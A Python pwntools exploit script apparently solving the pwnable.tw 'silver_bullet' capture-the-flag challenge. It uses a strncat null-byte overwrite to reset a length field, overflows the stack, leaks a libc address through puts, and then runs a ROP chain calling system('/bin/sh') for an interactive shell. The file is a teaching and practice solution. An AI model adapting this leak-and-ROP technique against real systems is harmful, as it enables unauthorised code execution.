from pwn import *


# x/20xw *(char**)($ebp+8)

# p = process("./silver_bullet")
with context.quiet:
    elf = ELF("./silver_bullet")
    libc = ELF("./libc_32.so.6")


def trigger_rop(p: process, payload):
    p.recvuntil(b"Your choice :")
    p.sendline(b"1")  # create bullet
    p.sendline(b"A" * 47)  # bullet desc
    info("Triggering power_up to modify least significant byte of bullet->len to 1")
    # strncat will put a null terminator at bullet+48, which is the least significat byte of bullet->length,
    # therefore bullet->length is now 0.
    # therefore after the calculation bullet->len = bullet_len + new_desc_len = 0 + 1 = 1
    # so we can overwrite 47 bytes of the stack AFTER buffer->desc
    p.recvuntil(b"Your choice :")
    p.sendline(b"2")  # power up
    p.sendline(b"B")  # other desc

    info("Sending stack payload...")
    p.clean()
    p.recvuntil(b"Your choice :")
    p.sendline(b"2")  # power up
    p.sendline(payload)  # bullet desc

    p.recvuntil(b"Your choice :")
    time.sleep(1)  # some sleep to let the menu show up again?
    info("Triggering ROP...")
    p.sendline(b"3")  # beat
    p.recvuntil(b"Oh ! You win !!\n", drop=True)


def stage0(p: process):
    # Leak libc addresses

    payload = b"".join(
        [
            b"\xff" * 3,  # overwrite 3 most significant bytes of bullet->len
            b"B" * 4,  # overwrite saved EBP
            p32(elf.plt["puts"]),  # puts@plt
            p32(0x08048954),
            p32(elf.got["puts"]),  # return address for puts@plt
        ]
    )

    trigger_rop(p, payload)

    libc_puts = u32(p.recv(4))
    libc_base = libc_puts - libc.sym["puts"]

    if libc_base % 0x1000 != 0:
        error("Failed to calculate libc base address")

    bin_sh_addr = next(libc.search(b"/bin/sh\x00")) + libc_base
    libc_system = libc.sym["system"] + libc_base
    info(f"libc base: {libc_base:#x}")
    info(f"libc system: {libc_system:#x}")
    info(f"libc puts: {libc_puts:#x}")
    info(f"/bin/sh address: {bin_sh_addr:#x}")
    return libc_system, bin_sh_addr


def stage1(p, libc_system: int, bin_sh_addr: int):
    # ROP to system

    payload = b"".join(
        [
            # 3 most significant bytes of bullet->len
            b"\xff" * 3,
            # saved EBP
            b"B" * 4,
            p32(libc_system),  # puts@plt
            # return address of system()
            p32(0xDEADBEEF),
            # system arg1
            p32(bin_sh_addr),
        ]
    )

    trigger_rop(p, payload)
    p.clean(timeout=1)
    p.interactive()


def exploit():
    p = remote("chall.pwnable.tw", 10103)

    libc_system, bin_sh_addr = stage0(p)
    stage1(p, libc_system, bin_sh_addr)


exploit()
